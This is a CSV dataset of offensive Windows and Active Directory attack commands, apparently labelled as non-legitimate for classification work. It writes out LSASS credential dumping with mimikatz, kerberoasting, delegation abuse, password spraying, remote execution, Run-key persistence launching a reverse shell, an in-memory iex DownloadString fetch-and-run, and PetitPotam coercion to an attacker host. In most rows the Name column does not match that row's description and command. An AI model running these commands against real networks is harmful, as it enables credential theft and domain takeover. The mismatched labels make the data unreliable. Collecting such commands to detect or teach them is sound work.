"Name","description","command","items","OS","attack_types","references","services","is_legit"
"SharpHound","SharpDump.exe is part of the GhostPack suite of tools and is a C# port of PowerSploit's Out-Minidump.ps1. It can dump the process for LSASS or a specific process given it's PID. This dump can then be fed into mimikatz to extract sensitive information. The following command simply dumps the LSASS process.","SharpDump.exe","Shell","Windows","[''PrivEsc''-|-''Enumeration'']","[''https://github.com/GhostPack/SharpDump''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","","false"
"SharpHound-LDAP","Seatbelt.exe is part of the GhostPack suite of tools that will perform a lot of ""safety checks"" on the Windows host and collect system data that could be useful for potential privilege escalation or persistence methods. The following command will run all checks on the system and store the output in a file (WARNING: will collect a lot of data. remove `-full` for less output).  Command Reference:  	Run all checks: -group=all  	Output File: output.txt","Seatbelt.exe -group=all -full > output.txt","Shell","Windows","[''PrivEsc''-|-''Persistence'']","[''https://github.com/GhostPack/Seatbelt''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","","false"
"SharpDump","SafetyKatz.exe is part of the GhostPack suite of tools and is a combination of SharpDump and Mimikatz. The following command will dump the LSASS process and run Mimikatz to extract credentials from the dumped process. Safetykatz also supports a number of mimikatz native commands such as ""sekurlsa::evasive-keys"" etc. The evasive switch in lab and production enviroments up to windows 2016 has been noted to successfully run where the non ""evasive"" switches had not","safetykatz.exe ""privilege::debug"" ""sekurlsa::evasive-logonpasswords"" ""exit""","Shell","Windows","[''PrivEsc''-|-''Enumeration'']","[''https://github.com/GhostPack/SafetyKatz''-|-''https://www.harmj0y.net/blog/redteaming/ghostpack/'']","","false"
"Seatbelt","SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, upload/download functionality, file name enumeration, and remote command execution. The following command will enumerate a list of SMB hosts for accessible SMB shares, both local and mapped drives, using valid credentials.  Command Reference:  	Domain: test.local  	SMB Hosts: smb-hosts.txt  	Username: john  	Password: password123","python3 smbmap.py --host-file smb-hosts.txt -u john -p 'password123' -d test.local -L","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/ShawnDEvans/smbmap''-|-''https://www.nopsec.com/blog/smbmap-wield-it-like-the-creator/'']","SMB","false"
"SafetyKatz","SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, upload/download functionality, file name enumeration, and remote command execution. The following command will enumerate a list of SMB hosts for accessible SMB shares, both local and mapped drives, without credentials (null session).  Command Reference:  	Domain: test.local  	SMB Hosts: smb-hosts.txt","python3 smbmap.py --host-file smb-hosts.txt -d test.local -L","No_Creds","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/ShawnDEvans/smbmap''-|-''https://www.nopsec.com/blog/smbmap-wield-it-like-the-creator/'']","SMB","false"
"SMBMap-Enum-Share","SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, upload/download functionality, file name enumeration, and remote command execution. The following command will enumerate a list of SMB hosts for files and filenames containing the keyword 'password'.  Command Reference:  	Domain: test.local  	SMB Hosts: smb-hosts.txt  	Username: john  	Password: password123","python3 smbmap.py --host-file smb-hosts.txt -u john -p 'password123' -d test.local -F password","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","Enumeration","[''https://github.com/ShawnDEvans/smbmap''-|-''https://www.nopsec.com/blog/smbmap-wield-it-like-the-creator/'']","SMB","false"
"SMBMap-Enum-Share-Anonymous","Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on the target server using valid credentials.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","smbclient -L \\test.local -I 10.10.10.1 -U john password123","[''Username''-|-''Password'']","Linux","Enumeration","https://www.samba.org/samba/docs/current/man-html/smbclient.1.html","SMB","false"
"SMBMap-Enum-File","Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on the target server using anonymous login.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local","smbclient -L \\test.local -I 10.10.10.1 -N","No_Creds","Linux","Enumeration","https://www.samba.org/samba/docs/current/man-html/smbclient.1.html","SMB","false"
"SMBClient-List-Shares","Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on the target ip using user John hash on test domain.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Hash: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX","smbclient -L \\10.10.10.1 -U test.local/john --pw-nt-hash XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX","[''Username''-|-''Hash'']","Linux","Enumeration","https://www.samba.org/samba/docs/current/man-html/smbclient.1.html","SMB","false"
"SMBClient-List-Shares-Anonymous","Smbclient is a tool used to communicate with SMB servers. The following command will connect to an SMB share `C$` using valid credentials.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	SMB Share: C$  	Username: john  	Password: password123","smbclient \\\\test.local\\C$ -I 10.10.10.1 -U john password123","[''Username''-|-''Password'']","Linux","Enumeration","[''https://www.samba.org/samba/docs/current/man-html/smbclient.1.html''-|-''https://www.madirish.net/59'']","SMB","false"
"SMBClient-List-Share-PTH","Smbclient is a tool used to communicate with SMB servers. The following command will connect to an SMB share `public` using anonymous login.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	SMB Share: public","smbclient \\\\test.local\\public -I 10.10.10.1 -N","No_Creds","Linux","Enumeration","[''https://www.samba.org/samba/docs/current/man-html/smbclient.1.html''-|-''https://www.madirish.net/59'']","SMB","false"
"SMBClient-Enum-Share","Rubeus' `s4u` module performs Kerberos constrained delegation attacks using the S4U2Self and S4U2Proxy. This technique abuses accounts configured with delegation privileges (msDS-AllowedToDelegateTo) to impersonate any domain user and further alter the service specified since SPNs are stored in plaintext and thus access any service on the target system as any user  Command Reference:  	Domain: test.local    SPN: time/dc.test.local    alternative service: ldap(can chose any valid services such as HTTP for remoting access)  	Username: john$  	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7","Rubeus.exe s4u /user:john$ /aes256:2a3de7fe356ee524cc9f3d579f2e0aa7 /impersonateuser:Administrator /msdsspn:time/dc.test.local /altservice:ldap /ptt","[''Hash''-|-''Username''-|-''target''-|-''service'']","Windows","[''Exploitation''-|-''Lateral Movement''-|-''Privilidge Escalation'']","[''https://github.com/GhostPack/Rubeus''-|-''https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/constrained-delegation''-|-''https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation'']","Kerberos","false"
"SMBClient-Enum-Share-Anonymous","Rubeus' `kerberoast` module will attempt to fetch Service Principal Names that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account's password, which can then be bruteforced offline. The following command is run on a Windows machine in the victim domain.  Command Reference:  	Output File: hashes.txt","Rubeus.exe kerberoast /outfile:hashes.txt","Shell","Windows","[''Exploitation''-|-''PrivEsc'']","[''https://github.com/GhostPack/Rubeus''-|-''https://github.com/GhostPack/Rubeus#kerberoast'']","Kerberos","false"
"Rubeus-s4u","Rubeus' `brute` module bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to brute force valid username and passwords logins given a list of usernames and a list of passwords.  Command Reference:  	Domain: test.local  	Username List: usernames.txt  	Password List: passwords.txt  	Output File: found_passwords.txt","Rubeus.exe /users:usernames.txt /passwords:passwords.txt /domain:test.local /outfile:found_passwords.txt","No_Creds","Windows","Enumeration","[''https://github.com/GhostPack/Rubeus''-|-''https://github.com/GhostPack/Rubeus#brute'']","Kerberos","false"
"Rubeus-Kerberoast","Rubeus' `asktgt` module uses a valid user's NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.  Command Reference:  	Domain: test.local  	Username: john  	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7","Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt","[''Hash''-|-''Username'']","Windows","Exploitation","[''https://github.com/GhostPack/Rubeus''-|-''https://github.com/GhostPack/Rubeus#asktgt'']","Kerberos","false"
"Rubeus-Brute","Rubeus' `asreproast` module will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will be encrypted with the user's password, which can then be cracked offline. The following command is run on a Windows machine in the victim domain.  Command Reference:  	Output File: hashes.txt","Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt","Shell","Windows","[''Exploitation''-|-''PrivEsc'']","[''https://github.com/GhostPack/Rubeus''-|-''https://github.com/GhostPack/Rubeus#asreproast'']","Kerberos","false"
"Rubeus-AskTGT","Responder is an LLMNR, NBT-NS, and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool will only answer to File Server Service request, which is for SMB. The following command will put Responder in analyze mode, listening for NBT-NS, BROWSER, and LLMNR requests without responding.  Command Reference:  	Interface: eth0","Responder -I eth0 -A","No_Creds","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/lgandx/Responder''-|-''https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/'']","[''NTLM''-|-''SMB'']","false"
"Rubeus-ASREPRoast","It is possible to gain persistence on a windows machine by adding reg keys that will execute an arbitrary payload during logon or startup. Keys added to the HKLM hive will execute on startup. Keys added to the HKCU hive will execute when the corresponding user logs on. Adding keys into the HKLM hive will require an elevated shell. There are four keys that can be used: Run, RunOnce, RunServices, and RunServicesOnce. By default, a RunOnce key is deleted after the specified command is executed. The path for these keys is the same for the HKLM and HKCU hives.  Command Reference:  	Value Name: Persistence  	RegKey data type: REG_SZ  	Data: ""C:\Path\To\revshell.exe""  	KeyName: ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run""","reg.exe add ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"" /v Persistence /t REG_SZ /d ""C:\Path\To\revshell.exe""  reg.exe add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" /v Persistence /t REG_SZ /d ""C:\Path\To\revshell.exe""","Shell","Windows","Persistence","[''https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/''-|-''https://www.hackingarticles.in/windows-persistence-using-winlogon/''-|-''https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg''-|-''https://docs.microsoft.com/en-us/windows-hardware/drivers/install/runonce-registry-key'']","","false"
"Responder-Analyze","rpcclient is a tool used for executing client side MS-RPC functions to manage Windows NT clients from Unix workstatios. From an offensive security standpoint, it can be used to enumerate users, groups, and other potentially sensitive information. The following command attempt to connect to the NetBIOS server anonymously, in order to enumerate using MS-RPC available commands/functions.  Command Reference:  	Target IP: 10.10.10.1","rpcclient -U '' -N 10.10.10.1","No_Creds","Linux","Enumeration","[''https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html''-|-''https://www.ired.team/offensive-security/enumeration-and-discovery/enumerating-windows-domains-using-rpcclient-through-socksproxy-bypassing-command-line-logging'']","RPC","false"
"Regexe-Persistence","pyWhisker is a tool allowing users to manipulate the msDS-KeyCredentialLink attribute of a target user/computer to obtain full control over that object. It's based on Impacket and on our Python equivalent of Michael Grafnetter's DSInternals called PyDSInternals. This tool, along with Dirk-jan's PKINITtools allow for a complete primitive exploitation on UNIX-based systems only.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 pywhisker.py -d ""test.local"" -u ""john"" -p ""password123"" --target ""user2"" --action ""list"" --dc-ip ""10.10.10.1""","[''Password''-|-''Username'']","Linux","Exploitation","https://github.com/shutdownrepo/pywhisker","Kerberos","false"
"RPCClient-Anonymous","ldapmonitor.py allows you to monitor creation, deletion and changes to LDAP objects live during your pentest.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","python3 ldapmonitor.py -u 'john' -d 'TEST.local' -p 'password123' --dc-ip 10.10.10.1","[''Password''-|-''Username''-|-''Hash'']","Linux","Enumeration","https://github.com/p0dalirius/LDAPmonitor/tree/master/python","[''LDAP''-|-''Kerberos''-|-''NTLM'']","false"
"PyWhisker","These commands provide a quick refernece for using the AD module to get situational awerness of the AD environment. Note that to get more commands that you can run, use the get command cmdlet, e.g. `Get-Command -Module ActiveDirectory` But Thes are the standard commands that will get you standard. Feel free to replace the first pipe with the -server ""your domain"" if you dont want to enumarate the entire forest. For more info on using the AD module, please check out our discussion on the AD module in WADCOMs.","#Getting all DCs in the forest (Get-ADForest).Domains | % { Get-ADDomainController -DomainName $_ -Discover }  #Getting all users in the forest (Get-ADForest).Domains | % { Get-ADUser -Filter * -Server $_ }  #Getting all computers in the forest (Get-ADForest).Domains | % { Get-ADComputer -Filter * -Server $_ }  #Mapping out entire trust relationships Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' | Select-Object Source,Target,Name  #Getting all groups in a domain. Note that the select statement will limit the output to only the matching fields the object contains Get-ADGroup -Filter * | Select-Object SamAccountName, GroupScope, DistinguishedName","","Windows","Enumeration","[''https://docs.microsoft.com/en-us/powershell/module/activedirectory/''-|-''https://github.com/samratashok/ADModule'']","","false"
"PyLDAPmonitor","Having imported the pwsh AD module referenced in the project, we can begin to use it to enumerate for potential points of exploit one of the prime being kerberos delegation attacks. The following 4 line commands will enumerate the entire AD forest for RBCD, Constrained and Unconstrained delegation attacks. Note that we will also factor in protocol trainsiton as those change the attack vector slightly. See references below","# 1. Unconstrained (turned on for all Domain controllers by default) (Get-ADForest).Domains | % { Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Server $_ | select Name,DNSHostName; Get-ADUser -Filter {TrustedForDelegation -eq $true} -Server $_ | select Name,SamAccountName }   # 2. Constrained (with protocol transition check) (Get-ADForest).Domains | % { Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like ""*""} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation -Server $_ | select Name,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo; Get-ADUser -Filter {msDS-AllowedToDelegateTo -like ""*""} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation -Server $_ | select Name,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo }  # 3. RBCD (which object is already configured) (Get-ADForest).Domains | % { Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity -Server $_ | ? {$_.""msDS-AllowedToActOnBehalfOfOtherIdentity""} | select Name,DNSHostName }  # 4. RBCD (which object can configure it - write access) (Get-ADForest).Domains | % { Get-ADComputer -Filter * -Properties nTSecurityDescriptor -Server $_ | ? {$_.nTSecurityDescriptor.Access | ? {$_.ActiveDirectoryRights -match ""GenericWrite|WriteProperty"" -and $_.IdentityReference -notmatch ""SYSTEM|Domain Admins""}} | select Name }","PowerShell","Windows","Enumeration","[''https://redfoxsec.com/blog/attacking-kerberos-delegation/''-|-''https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html''-|-''https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/''-|-''https://github.com/samratashok/ADModule'']","","false"
"PwshADmodule-Initial-Enum","The Active Directory Module from powershell can be used to preform most needed enumaration tasks as well as some exploitation tasks revoling around ACL/DACL/Delegation abuse. The modules does not need to be installed on the target, it is signed by microsoft and thus greatly reduces the risk of detection and lastly works without restriction in constrained language mode(CLM). This entry focused on downloading and importing it in memory for a given session, one liners can be found in other entries of WADCOMs","iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory","","Windows","[''Discovery''-|-''Credential Access'']","[''https://docs.microsoft.com/en-us/powershell/module/activedirectory/''-|-''https://github.com/samratashok/ADModule''-|-''https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html'']","","false"
"PwshADmodule-DelegationAttack-Enum","PetitPotam leverages the MS-EFSRPC API to connect to a Windows host, hijack the authentication session, and trigger an authentication from the target host to an attacker controlled host (usually SMB or HTTP server). This captured authentication can then be relayed to authenticate to other hosts and perform more attacks. See more in ntlmrelayx.py.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/topotam/PetitPotam''-|-''https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory'']","[''RPC''-|-''NTLM'']","false"
"Powershell-ADModule-enum","Kerberoasting is the act of requesting service tickes for accounts that have an SPN set, and then attempting to crack those hashes offline.  This one liner using the powershell AD module serves less as a feasiable attack and more as a PoC that the AD module with some ingenuity can be used to exploit many vectors within AD that you otherwise import tools that are not signed, need obfiscation, require AV/EDR bypass or other steps that may trigger alerts.","Get-ADUser -Filter {ServicePrincipalName -ne ""$null"" -and Enabled -eq $true} -Properties ServicePrincipalName | select -ExpandProperty ServicePrincipalName | % { $spn = $_; Add-Type -AssemblyName System.IdentityModel; $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; $ticketBytes = $ticket.GetRequest(); $ticketBase64 = [System.Convert]::ToBase64String($ticketBytes); $account = (Get-ADUser -Filter {ServicePrincipalName -eq $spn} -Properties SamAccountName).SamAccountName; Write-Output ""===== $account : $spn =====`n$ticketBase64"" } | Out-File -FilePath ""kerberos_tickets.txt"" -Encoding ASCII","powershell","Windows","Exploitation","https://github.com/samratashok/ADModule","Kerberos","false"
"PetitPotam","PKINIT gettgtpkinit.py request a TGT using a PFX file, either as file or as base64 encoded blob, or PEM files for cert+key. This uses Kerberos PKINIT and will output a TGT into the specified ccache. It will also print the AS-REP encryption key which you may need for the getnthash.py tool.  Command Reference:    Domain: test.local    Host that you got the certificate from: DC01    PFX file: crt.pfx    PFX file password: password123    TGT requested: out.ccache","python3 gettgtpkinit.py test.local/DC01\$ -cert-pfx crt.pfx -pfx-pass password123 out.ccache","[''Username''-|-''Password''-|-''PFX'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''PrivEsc'']","[''https://github.com/dirkjanm/PKINITtools''-|-''https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/'']","Kerberos","false"
"PSADmodule-Kerbaroasting","PKINIT getnthash.py request a TGS for yourself using Kerberos U2U. This will include with the PAC which in turn contains the NT hash that you can decrypt with the AS-REP key that you got from your TGT request using gettgtpkinit.py from PKINIT. Use the TGT from gettgtpkinit.py in your KRB5CCNAME env variable.  Command Reference:    Domain: test.local    Host that you got the TGT from: DC01    TGT from gettgtpkinit.py: out.ccache    AS-REP key: 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773","KRB5CCNAME=out.ccache python3 getnthash.py test.local/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773","TGT","[''Linux''-|-''Windows'']","[''Exploitation''-|-''PrivEsc'']","[''https://github.com/dirkjanm/PKINITtools''-|-''https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/'']","Kerberos","false"
"PKINIT-gettgtpkinit","Nmap's `krb5-enum-users` script attempts to bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to enumerate valid usernames given a list of usernames to try.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username List: usernames.txt","nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='test.local',userdb=usernames.txt 10.10.10.1","No_Creds","[''Linux''-|-''Windows'']","Enumeration","[''https://nmap.org/download.html''-|-''https://nmap.org/nsedoc/scripts/krb5-enum-users.html'']","[''Kerberos''-|-''Enumeration'']","false"
"PKINIT-getnthash","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will perform password spraying over SMB against the domain controller.  Command Reference:  	Domain Controller IP: 10.10.10.1  	Username List: users.txt  	Password: password123","nxc smb 10.10.10.1 -u users.txt -p password123","Username","Linux","Exploitation","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"Nmap-Krb5-Enum-Users","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will execute a powershell command on the target machine if the user has Administrator privileges. using ""-x"" will execute from cmd.  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	Password: password123","nxc smb 10.10.10.1 -u 'john' -p 'password123' -X '$Host'","[''Username''-|-''Password'']","Linux","Exploitation","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"NetExec-SMB-Password-Spray","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will enumerate domain groups, local groups, logged on users, relative identifiers (RIDs), sessions, domain users, SMB shares/permissions, and get the domain password policy. You can also use CIDR notation to target a range of ip addresses (i.e. 10.10.10.0/24).  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	Password: password123","nxc smb 10.10.10.1 -u 'john' -p 'password123' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol","[''Username''-|-''Password'']","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"NetExec-Exec-SMB","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. The following command will enumerate a list of SMB hosts with signing not enforced, allowing you to relay credentials to them using ntlmrelayx.py.  Command Reference:  	SMB Hosts: smb_hosts.txt","nxc smb smb_host.txt --gen-relay-list output.txt","No_Creds","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"NetExec-Enum-SMB","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will enumerate the SMB host using a null session.   Command Reference:  	Target IP: 10.10.10.1","nxc smb 10.10.10.1 -u '' -p ''","No_Creds","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
